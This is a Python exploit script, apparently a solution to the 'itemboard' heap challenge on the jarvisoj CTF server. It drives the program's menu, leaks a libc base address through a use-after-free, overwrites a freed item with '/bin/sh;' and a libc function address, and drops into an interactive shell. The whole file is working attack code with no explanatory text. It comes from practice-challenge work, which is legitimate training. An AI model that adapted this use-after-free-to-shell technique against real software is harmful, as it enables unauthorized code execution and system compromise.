#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from struct import unpack
from time import sleep
import sys


#  def DEBUG():
    #  print pidof(io)[0]
    #  raw_input("DEBUG: ")

conn = "./itemboard" if sys.argv[1] == "l" else ('pwn2.jarvisoj.com', 9887)
io = zio(('pwn2.jarvisoj.com', 9887), timeout = 10000, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'green'))

def add(name, length, des):
    io.read_until(":\n")
    io.writeline("1")
    io.read_until("?\n")
    io.writeline(name)
    io.read_until("?\n")
    io.writeline(str(length))
    io.read_until("?\n")
    io.writeline(des)

def show(idx):
    io.read_until(":\n")
    io.writeline("3")
    io.read_until("?\n")
    io.writeline(str(idx))

def remove(idx):
    io.read_until(":\n")
    io.writeline("4")
    io.read_until("?\n")
    io.writeline(str(idx))

if __name__ == '__main__':
    add('aaaa', 0x80, 'aaaa')
    add('bbbb', 0x80, 'bbbb')
    remove(0)
    show(0)

    libcBase = b64(io.read_until('\x7f')[-6: ].ljust(8, '\x00')[::-1]) - 88 - 0x3be760
    print "[*]libcBase -> {:#x}".format(libcBase)
    raw_input("")

    add('cccc', 32, 'cccc')
    add('dddd', 32, 'dddd')
    remove(2)
    remove(3)

    add('eeee', 24, '/bin/sh;' + 'eeeeeeee' + l64(libcBase + 0x46590))
    remove(2)

    io.interact()
    io.close()

